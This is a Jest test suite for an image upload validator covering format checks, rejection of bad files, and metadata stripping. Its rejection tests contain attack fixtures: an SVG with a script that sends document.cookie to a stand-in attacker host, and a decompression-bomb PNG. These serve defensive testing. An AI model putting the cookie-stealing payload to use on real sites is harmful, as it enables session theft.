import sharp from 'sharp';
import { ImageValidationService } from '../src/modules/images/image-validation.service';
import { loadConfiguration } from '../src/config/configuration';
import { ErrorCode } from '../src/common/errors/api-error';

/**
 * Upload validation.
 *
 * This is the main untrusted-input boundary in the API, so these tests are
 * written as attacks rather than as happy paths: a text file wearing an image
 * content type, an SVG carrying script, a decompression bomb, a truncated
 * stream, a polyglot with data appended after the image.
 */

const config = loadConfiguration({
  NODE_ENV: 'test',
  DATABASE_URL: 'postgresql://u:p@localhost:5432/d',
  JWT_ACCESS_SECRET: 'a'.repeat(40),
  JWT_REFRESH_SECRET: 'b'.repeat(40),
  AI_SERVICE_URL: 'http://localhost:8000',
  AI_SERVICE_INTERNAL_KEY: 'c'.repeat(32),
} as NodeJS.ProcessEnv);

const service = new ImageValidationService(config);

/** A real, decodable image of a solid colour. */
async function makeImage(
  width = 200,
  height = 300,
  colour = { r: 120, g: 207, b: 247 },
  format: 'png' | 'jpeg' | 'webp' = 'png',
): Promise<Buffer> {
  const pipeline = sharp({
    create: { width, height, channels: 3, background: colour },
  });
  return format === 'png'
    ? pipeline.png().toBuffer()
    : format === 'jpeg'
      ? pipeline.jpeg().toBuffer()
      : pipeline.webp().toBuffer();
}

describe('Accepted formats', () => {
  it.each(['png', 'jpeg', 'webp'] as const)('accepts %s', async (format) => {
    const buffer = await makeImage(200, 300, undefined, format);
    const result = await service.validate(buffer, `image/${format}`, `tube.${format}`);

    expect(result.format).toBe(format);
    expect(result.width).toBe(200);
    expect(result.height).toBe(300);
    expect(result.contentHash).toMatch(/^[a-f0-9]{64}$/);
  });

  it('preserves the original bytes untouched', async () => {
    const buffer = await makeImage();
    const result = await service.validate(buffer, 'image/png');

    // The original is the evidentiary record and must not be re-encoded.
    expect(result.original.equals(buffer)).toBe(true);
    // The derivative is a separate, normalised copy.
    expect(result.normalised.equals(buffer)).toBe(false);
  });

  it('produces a stable content hash', async () => {
    const buffer = await makeImage();
    const [first, second] = await Promise.all([
      service.validate(buffer, 'image/png'),
      service.validate(buffer, 'image/png'),
    ]);
    expect(first.contentHash).toBe(second.contentHash);
  });
});

describe('Rejected input', () => {
  it('rejects an empty file', async () => {
    await expect(service.validate(Buffer.alloc(0))).rejects.toMatchObject({
      code: ErrorCode.INVALID_IMAGE,
    });
  });

  it('rejects a text file claiming to be a PNG', async () => {
    // The declared content type is attacker-controlled; the bytes are not.
    const fake = Buffer.from('this is not an image, it is a love letter');
    await expect(service.validate(fake, 'image/png', 'photo.png')).rejects.toMatchObject({
      code: ErrorCode.UNSUPPORTED_MEDIA_TYPE,
    });
  });

  it('rejects SVG and explains why', async () => {
    const svg = Buffer.from(
      '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">' +
        '<script>fetch("https://attacker.test?c="+document.cookie)</script></svg>',
    );
    await expect(
      service.validate(svg, 'image/svg+xml', 'chart.svg'),
    ).rejects.toMatchObject({
      code: ErrorCode.UNSUPPORTED_MEDIA_TYPE,
      // The message names SVG specifically — it is the most common rejected
      // upload and the reason is worth stating.
      message: expect.stringContaining('SVG'),
    });
  });

  it('rejects a GIF, which is not in the allowlist', async () => {
    const gif = Buffer.concat([Buffer.from('GIF89a', 'ascii'), Buffer.alloc(100, 0x42)]);
    await expect(service.validate(gif, 'image/gif')).rejects.toMatchObject({
      code: ErrorCode.UNSUPPORTED_MEDIA_TYPE,
    });
  });

  it('rejects a file above the size limit', async () => {
    const oversized = Buffer.alloc(config.uploads.maxBytes + 1, 0xff);
    // Signature check never runs: size is checked first, cheapest-first.
    await expect(service.validate(oversized)).rejects.toMatchObject({
      code: ErrorCode.IMAGE_TOO_LARGE,
    });
  });

  it('rejects an image below the minimum usable size', async () => {
    const tiny = await makeImage(32, 32);
    await expect(service.validate(tiny, 'image/png')).rejects.toMatchObject({
      code: ErrorCode.INVALID_IMAGE,
      message: expect.stringContaining('too small'),
    });
  });

  it('rejects a truncated PNG', async () => {
    const full = await makeImage(400, 400);
    const truncated = full.subarray(0, Math.floor(full.length / 3));
    // The signature still matches — the failure must come from the decode.
    await expect(service.validate(truncated, 'image/png')).rejects.toMatchObject({
      code: ErrorCode.INVALID_IMAGE,
    });
  });

  it('rejects a decompression bomb', async () => {
    // A highly compressible image whose pixel count exceeds the cap. Small on
    // disk, enormous once decoded — the classic memory-exhaustion upload.
    const bomb = await sharp({
      create: {
        width: 12000,
        height: 12000,
        channels: 3,
        background: { r: 255, g: 255, b: 255 },
      },
    })
      .png({ compressionLevel: 9 })
      .toBuffer();

    const strict = new ImageValidationService({
      ...config,
      uploads: { ...config.uploads, maxBytes: 50_000_000, maxPixels: 10_000_000 },
    });

    await expect(strict.validate(bomb, 'image/png')).rejects.toMatchObject({
      code: ErrorCode.INVALID_IMAGE,
      message: expect.stringContaining('pixels'),
    });
  });
});

describe('Normalisation', () => {
  it('warns when the declared type does not match the actual format', async () => {
    const png = await makeImage();
    const result = await service.validate(png, 'image/jpeg', 'mislabelled.jpg');

    // Not fatal — browsers get this wrong routinely — but recorded, because
    // it is also what a deliberate attempt looks like.
    expect(result.mimeType).toBe('image/png');
    expect(result.warnings.some((w) => w.includes('Declared content type'))).toBe(true);
  });

  it('strips EXIF from the derivative', async () => {
    const withExif = await sharp({
      create: {
        width: 200,
        height: 200,
        channels: 3,
        background: { r: 10, g: 20, b: 30 },
      },
    })
      .withExif({ IFD0: { Copyright: 'Test', Software: 'BreadGuard test suite' } })
      .jpeg()
      .toBuffer();

    const result = await service.validate(withExif, 'image/jpeg');
    const derivativeMeta = await sharp(result.normalised).metadata();

    // EXIF can carry GPS coordinates and device serials; it has no business
    // travelling with a laboratory image.
    expect(derivativeMeta.exif).toBeUndefined();
  });

  it('reports post-rotation dimensions so ROI coordinates line up', async () => {
    // Orientation 6 means "rotate 90° clockwise on display". The stored
    // dimensions must describe what the user actually saw, otherwise a region
    // of interest refers to the wrong pixels.
    const rotated = await sharp({
      create: { width: 400, height: 200, channels: 3, background: { r: 1, g: 2, b: 3 } },
    })
      .withMetadata({ orientation: 6 })
      .jpeg()
      .toBuffer();

    const result = await service.validate(rotated, 'image/jpeg');

    expect(result.width).toBe(200);
    expect(result.height).toBe(400);

    const derivativeMeta = await sharp(result.normalised).metadata();
    expect(derivativeMeta.width).toBe(result.width);
    expect(derivativeMeta.height).toBe(result.height);
  });

  it('does not retain GPS metadata', async () => {
    const buffer = await makeImage();
    const result = await service.validate(buffer, 'image/png');

    const serialised = JSON.stringify(result.captureMetadata).toLowerCase();
    expect(serialised).not.toContain('gps');
    expect(serialised).not.toContain('latitude');
    expect(serialised).not.toContain('serial');
  });

  it('records that colour management was absent', async () => {
    // Almost no phone photo carries an ICC profile. Not an error, but it
    // bounds how far colour comparison can be trusted, so it is recorded.
    const buffer = await makeImage();
    const result = await service.validate(buffer, 'image/png');
    expect(result.captureMetadata.colour_management).toBe('absent');
  });

  it('produces a losslessly re-encoded derivative', async () => {
    // The derivative is what gets measured, so it must not carry JPEG
    // artefacts introduced by the normalisation step itself.
    const jpeg = await makeImage(200, 200, { r: 120, g: 207, b: 247 }, 'jpeg');
    const result = await service.validate(jpeg, 'image/jpeg');

    const meta = await sharp(result.normalised).metadata();
    expect(meta.format).toBe('png');
  });
});
